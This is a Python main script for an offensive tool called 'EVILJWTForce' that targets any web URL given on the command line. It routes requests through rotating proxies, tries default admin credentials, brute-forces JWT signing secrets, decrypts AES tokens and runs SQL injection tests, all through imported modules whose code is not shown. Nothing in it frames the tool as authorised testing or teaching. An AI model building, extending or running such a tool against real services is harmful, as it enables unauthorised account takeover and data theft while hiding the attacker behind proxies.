import asyncio
from core.auth import Authenticator
from core.bruteforce import JWTBruteforcer
from core.wordlist_generator import WordlistGenerator
from utils.logger import setup_logging
from config.settings import load_config
from core.aes_decrypt import AESDecryptor
from core.sql_injector import SQLInjector
from core.report import ReportGenerator
from utils.proxy_rotator import ProxyRotator
from pathlib import Path

class EVILJWTForce:
    def __init__(self, target_url: str, proxy_file: str = None):
        self.target_url = target_url
        self.proxy_rotator = ProxyRotator(proxy_file) if proxy_file else None
        self._setup_directories()
        
    def _setup_directories(self):
        dirs = ['output', 'logs', 'reports']
        for dir_name in dirs:
            Path(dir_name).mkdir(parents=True, exist_ok=True)
            
    async def run_automatic_mode(self):
        # 1. Authentication and credential extraction
        auth = Authenticator(self.target_url, self.proxy_rotator.get_random_proxy() if self.proxy_rotator else None)
        
        # Try default credentials
        default_creds = [('admin', 'admin'), ('test', 'test123')]
        for username, password in default_creds:
            if auth.authenticate(username, password):
                print(f"[+] Successfully authenticated with {username}:{password}")
                break
                
        # 2. Generate wordlist
        wordlist_gen = WordlistGenerator()
        wordlist_gen.generate()
        
        # 3. JWT Bruteforce
        bruteforcer = JWTBruteforcer()
        await bruteforcer.start()
        
        # 4. AES Decryption
        decryptor = AESDecryptor()
        decryptor.decrypt_tokens()
        
        # 5. SQL Injection (if enabled)
        sql_injector = SQLInjector()
        sql_injector.test_injection()
        
        # 6. Generate final report
        report_gen = ReportGenerator()
        report_gen.generate()
        
    def run(self, mode: str = "auto"):
        if mode == "auto":
            asyncio.run(self.run_automatic_mode())
        else:
            print("Manual mode not implemented yet")

if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python main.py <target_url> [proxy_file]")
        sys.exit(1)
        
    target_url = sys.argv[1]
    proxy_file = sys.argv[2] if len(sys.argv) > 2 else None
    
    evil_jwt = EVILJWTForce(target_url, proxy_file)
    evil_jwt.run("auto")